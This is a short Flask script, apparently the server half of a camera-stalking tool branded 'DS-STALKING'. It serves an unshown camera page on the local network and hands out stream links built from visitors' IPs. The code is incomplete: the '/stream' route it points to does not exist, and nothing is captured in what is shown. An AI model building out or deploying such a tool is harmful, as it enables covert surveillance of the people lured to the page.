from flask import Flask, render_template, request, jsonify
import socket
import pyfiglet
import os

# Créer une interface ASCII art avec pyfiglet
def display_interface():
    custom_fig = pyfiglet.Figlet(font="small")
    ascii_art_text = custom_fig.renderText("DS-STALKING")
    info = [
        "BY: 2806",
        "Telegram: t.me/Mr_2806",
        "Tiktok: dedsec_x.0",
        "Youtube: Dedsec assistant"
    ]
    border = "=" * 40
    print(border)
    print(ascii_art_text)
    for line in info:
        print(f"  {line}")
    print(border)

# Afficher l'interface ASCII au démarrage
display_interface()

# Initialiser l'application Flask
app = Flask(__name__)

# Obtenir l'adresse IP locale de l'ordinateur
def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))  # Connexion à un serveur Google pour obtenir l'IP
        ip = s.getsockname()[0]
    except Exception:
        ip = "127.0.0.1"  # Si l'IP ne peut pas être obtenue, utiliser localhost
    finally:
        s.close()
    return ip

# Route principale qui rend la page HTML de la caméra
@app.route("/")
def home():
    return render_template("camera.html")

# Route pour générer le lien de streaming
@app.route("/stream_link", methods=["POST"])
def stream_link():
    client_ip = request.remote_addr
    port = os.environ.get("FLASK_PORT", 5000)  # Utilisation de la variable d'environnement ou de 5000 par défaut
    stream_url = f"http://{client_ip}:{port}/stream"
    return jsonify({"stream_url": stream_url})

if __name__ == "__main__":
    # Obtenir l'IP locale de l'ordinateur
    local_ip = get_local_ip()
    
    # Choisir un port aléatoire pour chaque exécution du serveur (optionnel)
    port = 5000  # Vous pouvez choisir un autre port ou laisser la valeur par défaut
    
    # Afficher les informations sur l'adresse IP locale
    print(f"Serveur en cours d'exécution sur : http://{local_ip}:{port}")
    
    # Démarrer l'application Flask, accessible depuis tous les appareils du réseau local
    app.run(host="0.0.0.0", port=port, debug=False)  # 0.0.0.0 pour permettre l'accès réseau